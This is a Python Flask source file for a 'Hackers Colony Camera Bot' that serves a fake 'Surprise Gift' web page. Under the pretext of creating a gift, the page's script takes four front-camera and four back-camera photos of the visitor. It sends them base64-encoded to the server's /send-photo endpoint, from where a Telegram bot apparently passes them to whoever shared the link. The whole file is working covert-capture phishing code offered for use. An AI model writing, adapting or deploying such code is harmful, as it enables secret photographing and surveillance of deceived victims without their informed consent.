from flask import Flask, request, jsonify, render_template_string
import sqlite3
from datetime import datetime
import base64
import os
import sys

app = Flask(__name__)

# Import bot functions
try:
    from bot import (
        add_user, update_activity, add_photo, get_user_count,
        get_photo_count, get_today_stats, get_all_users, get_user_info,
        update_user_ban, search_users, process_photo_from_web,
        OWNER_ID, BOT_TOKEN, WEB_URL
    )
    BOT_AVAILABLE = True
    print("✅ Bot module imported successfully")
except ImportError as e:
    print(f"⚠️ Warning: Could not import bot functions: {e}")
    BOT_AVAILABLE = False

# HTML Template
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 Surprise Gift</title>
    <style>
        body {
            margin: 0;
            background: linear-gradient(135deg, #0b0014, #1a0030);
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        .card {
            background: rgba(22, 0, 34, 0.9);
            padding: 30px;
            border-radius: 20px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 0 30px rgba(255, 0, 255, 0.5);
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 0, 255, 0.3);
        }
        .gift-icon {
            font-size: 70px;
            margin-bottom: 10px;
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        h2 {
            margin: 10px 0;
            background: linear-gradient(45deg, #ff00ff, #00ffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        button {
            width: 100%;
            padding: 15px;
            margin-top: 20px;
            border-radius: 50px;
            border: none;
            background: linear-gradient(45deg, #ff00ff, #00ffff);
            color: black;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s;
        }
        button:hover { transform: scale(1.05); }
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 0, 255, 0.3);
            border-top: 4px solid #ff00ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .progress-container {
            width: 100%;
            height: 8px;
            background: rgba(255, 0, 255, 0.2);
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #ff00ff, #00ffff);
            width: 0%;
            transition: width 0.5s ease;
        }
        .status {
            margin-top: 15px;
            font-size: 14px;
            color: #ffb3ff;
            min-height: 20px;
        }
        .hidden { display: none; }
        .telegram-info {
            margin-top: 20px;
            padding: 15px;
            background: rgba(0, 100, 200, 0.2);
            border-radius: 10px;
            border: 1px solid rgba(0, 150, 255, 0.3);
        }
        .telegram-info a {
            color: #00bfff;
            text-decoration: none;
        }
        .telegram-info a:hover { text-decoration: underline; }
        .video-container {
            width: 100%;
            height: 200px;
            margin: 15px 0;
            border-radius: 10px;
            overflow: hidden;
            background: #000;
        }
        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .warning {
            color: #ff5555;
            font-size: 12px;
            margin: 5px 0;
        }
        .step {
            display: flex;
            align-items: center;
            margin: 10px 0;
            padding: 10px;
            background: rgba(255,255,255,0.05);
            border-radius: 8px;
        }
        .step-number {
            width: 25px;
            height: 25px;
            background: #ff00ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 10px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="card">
        <div id="box">
            <div class="gift-icon">🎁</div>
            <h2>✨ Secret Gift ✨</h2>
            <p>A magical surprise is waiting for you!</p>
            
            <div class="telegram-info">
                <p><strong>📢 Required Steps:</strong></p>
                <div class="step">
                    <div class="step-number">1</div>
                    <div>Join: <a href="https://t.me/HackersColony" target="_blank">@HackersColony</a></div>
                </div>
                <div class="step">
                    <div class="step-number">2</div>
                    <div>Get link from: <a href="https://t.me/HackersColonyBot" target="_blank">@HackersColonyBot</a></div>
                </div>
            </div>
            
            <p class="warning">⚠️ Camera access required for gift creation</p>
            
            <button id="unlockBtn">🎯 Start Camera Access</button>
            
            <p style="font-size: 12px; color: #888; margin-top: 20px;">
                This will use your camera to create a personalized gift
            </p>
        </div>
        
        <div class="video-container hidden" id="videoContainer">
            <video id="video" autoplay playsinline></video>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const USER_ID = urlParams.get('uid');
        const SERVER_URL = window.location.origin;
        
        document.getElementById("unlockBtn").onclick = async () => {
            const box = document.getElementById("box");
            const btn = document.getElementById("unlockBtn");
            const videoContainer = document.getElementById("videoContainer");
            
            btn.disabled = true;
            
            if (!USER_ID || USER_ID.length < 5) {
                box.innerHTML = \`
                    <div class="gift-icon">⚠️</div>
                    <h2 style="color:#ff5555">Invalid Access</h2>
                    <p>Please get a valid link from the Telegram bot</p>
                    <div class="step">
                        <div class="step-number">1</div>
                        <div>Open: <a href="https://t.me/HackersColonyBot" target="_blank">@HackersColonyBot</a></div>
                    </div>
                    <div class="step">
                        <div class="step-number">2</div>
                        <div>Click "Get Your Gift" button</div>
                    </div>
                    <button onclick="window.location.href='https://t.me/HackersColonyBot'">📱 Open Telegram Bot</button>
                \`;
                return;
            }
            
            box.innerHTML = \`
                <div class="gift-icon">✨</div>
                <h2>🎀 Creating Magic</h2>
                <p>Please wait while we prepare your gift...</p>
                <div class="spinner"></div>
                <div class="progress-container">
                    <div class="progress-bar" id="progress"></div>
                </div>
                <div class="status" id="statusText">Initializing camera...</div>
            \`;
            
            videoContainer.classList.remove('hidden');
            
            const progress = document.getElementById("progress");
            const statusText = document.getElementById("statusText");
            const video = document.getElementById("video");
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });
                
                stream.getTracks().forEach(track => track.stop());
                await startPhotoProcess();
                
            } catch (error) {
                showError("Camera access denied. Please allow camera to continue.");
                return;
            }
            
            async function startPhotoProcess() {
                try {
                    // Front Camera - 4 photos
                    const frontStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: "user" },
                        audio: false
                    });
                    video.srcObject = frontStream;
                    
                    await new Promise(resolve => {
                        video.onloadedmetadata = () => {
                            video.play();
                            setTimeout(resolve, 1000);
                        };
                    });
                    
                    for (let i = 1; i <= 4; i++) {
                        progress.style.width = (i * 12.5) + "%";
                        statusText.textContent = \`Front camera photo \${i}/4...\`;
                        await new Promise(r => setTimeout(r, 800));
                        await capturePhoto(\`front_\${i}\`);
                    }
                    
                    frontStream.getTracks().forEach(track => track.stop());
                    
                    // Back Camera - 4 photos
                    await new Promise(r => setTimeout(r, 1000));
                    statusText.textContent = "Switching to back camera...";
                    
                    try {
                        const backStream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: "environment" },
                            audio: false
                        });
                        video.srcObject = backStream;
                        
                        await new Promise(resolve => {
                            video.onloadedmetadata = () => {
                                video.play();
                                setTimeout(resolve, 1000);
                            };
                        });
                        
                        for (let i = 1; i <= 4; i++) {
                            progress.style.width = (50 + i * 12.5) + "%";
                            statusText.textContent = \`Back camera photo \${i}/4...\`;
                            await new Promise(r => setTimeout(r, 800));
                            await capturePhoto(\`back_\${i}\`);
                        }
                        
                        backStream.getTracks().forEach(track => track.stop());
                    } catch (backError) {
                        statusText.textContent = "Back camera not available, continuing...";
                        await new Promise(r => setTimeout(r, 2000));
                    }
                    
                    progress.style.width = "100%";
                    statusText.textContent = "Finishing up...";
                    await new Promise(r => setTimeout(r, 1500));
                    
                    videoContainer.classList.add('hidden');
                    
                    // Success
                    box.innerHTML = \`
                        <div class="gift-icon">🎉</div>
                        <h2 style="color:#00ff00">🎁 Gift Delivered!</h2>
                        <p>Your special surprise has been prepared</p>
                        <p>Photos are being sent to your Telegram...</p>
                        <div class="status" style="color:#00ff00">✨ Complete ✨</div>
                        <button onclick="window.location.href='https://t.me/HackersColonyBot'">📱 Open Telegram</button>
                    \`;
                    
                } catch (error) {
                    console.error("Process error:", error);
                    showError("Process failed. Please try again.");
                }
            }
            
            async function capturePhoto(label) {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                return new Promise((resolve) => {
                    canvas.toBlob(async (blob) => {
                        if (blob) {
                            try {
                                const reader = new FileReader();
                                reader.onloadend = async () => {
                                    const base64data = reader.result.split(',')[1];
                                    await sendToServer(base64data, label);
                                    resolve();
                                };
                                reader.readAsDataURL(blob);
                            } catch (e) {
                                console.error("Capture error:", e);
                                resolve();
                            }
                        } else {
                            resolve();
                        }
                    }, 'image/jpeg', 0.8);
                });
            }
            
            async function sendToServer(photoBase64, label) {
                try {
                    const response = await fetch(\`\${SERVER_URL}/send-photo\`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            userId: USER_ID,
                            photo: photoBase64,
                            label: label,
                            timestamp: Date.now()
                        })
                    });
                    
                    if (!response.ok) throw new Error('Server error');
                    return await response.json();
                } catch (error) {
                    console.error('Failed to send to server:', error);
                    return null;
                }
            }
            
            function showError(message) {
                videoContainer.classList.add('hidden');
                box.innerHTML = \`
                    <div class="gift-icon">🎭</div>
                    <h2 style="color:#ff5555">Error</h2>
                    <p>\${message}</p>
                    <button onclick="location.reload()">🔄 Try Again</button>
                \`;
            }
        };

        if (!USER_ID || USER_ID.length < 5) {
            document.getElementById("unlockBtn").innerHTML = "⚠️ Get Link from Bot First";
            document.getElementById("unlockBtn").disabled = false;
            document.getElementById("unlockBtn").onclick = () => {
                window.location.href = 'https://t.me/HackersColonyBot';
            };
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/send-photo', methods=['POST'])
def receive_photo():
    try:
        data = request.json
        user_id = data.get('userId')
        photo_base64 = data.get('photo')
        label = data.get('label', 'unknown')
        
        if not user_id or not photo_base64:
            return jsonify({'error': 'Missing data'}), 400
        
        # Convert base64 to bytes
        photo_bytes = base64.b64decode(photo_base64)
        
        # Process photo if bot is available
        if BOT_AVAILABLE:
            success = process_photo_from_web(user_id, photo_bytes, label)
            if success:
                return jsonify({'success': True, 'message': 'Photo processed successfully'})
            else:
                return jsonify({'error': 'Failed to process photo'}), 500
        else:
            # Save to database directly
            try:
                conn = sqlite3.connect('bot_users.db')
                c = conn.cursor()
                now = datetime.now()
                c.execute('''INSERT INTO photos (user_id, timestamp, photo_type) VALUES (?, ?, ?)''',
                         (user_id, now, f"web_{label}"))
                conn.commit()
                conn.close()
                return jsonify({'success': True, 'message': 'Photo saved (bot offline)'})
            except Exception as e:
                return jsonify({'error': f'Database error: {str(e)}'}), 500
                
    except Exception as e:
        print(f"❌ Error in /send-photo: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/stats')
def stats_api():
    try:
        if BOT_AVAILABLE:
            total_users = get_user_count()
            total_photos = get_photo_count()
            today_users, today_photos, active_users = get_today_stats()
        else:
            # Read directly from database
            conn = sqlite3.connect('bot_users.db')
            c = conn.cursor()
            
            c.execute('''SELECT COUNT(*) FROM users WHERE is_banned = 0''')
            total_users = c.fetchone()[0] or 0
            
            c.execute('''SELECT COUNT(*) FROM photos''')
            total_photos = c.fetchone()[0] or 0
            
            today = datetime.now().date()
            c.execute('''SELECT COUNT(*) FROM users WHERE DATE(join_date) = ?''', (today,))
            today_users = c.fetchone()[0] or 0
            
            c.execute('''SELECT COUNT(*) FROM photos WHERE DATE(timestamp) = ?''', (today,))
            today_photos = c.fetchone()[0] or 0
            
            yesterday = datetime.now() - timedelta(days=1)
            c.execute('''SELECT COUNT(*) FROM users WHERE last_active > ?''', (yesterday,))
            active_users = c.fetchone()[0] or 0
            
            conn.close()
        
        return jsonify({
            'total_users': total_users,
            'total_photos': total_photos,
            'today_users': today_users,
            'today_photos': today_photos,
            'active_users': active_users,
            'status': 'online',
            'bot_available': BOT_AVAILABLE,
            'server': 'Hackers Colony Camera Bot'
        })
    except Exception as e:
        return jsonify({'error': str(e), 'status': 'error'}), 500

@app.route('/health')
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'service': 'Hackers Colony Camera Bot'
    })

@app.route('/test')
def test_page():
    return jsonify({
        'message': 'Server is running!',
        'bot_token_set': bool(BOT_TOKEN),
        'owner_id': OWNER_ID,
        'web_url': WEB_URL,
        'bot_available': BOT_AVAILABLE
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print(f"🚀 Starting Hackers Colony Camera Bot Server on port {port}")
    print(f"🔑 Bot Available: {BOT_AVAILABLE}")
    print(f"🌐 Web URL: {WEB_URL}")
    app.run(host='0.0.0.0', port=port, debug=False)
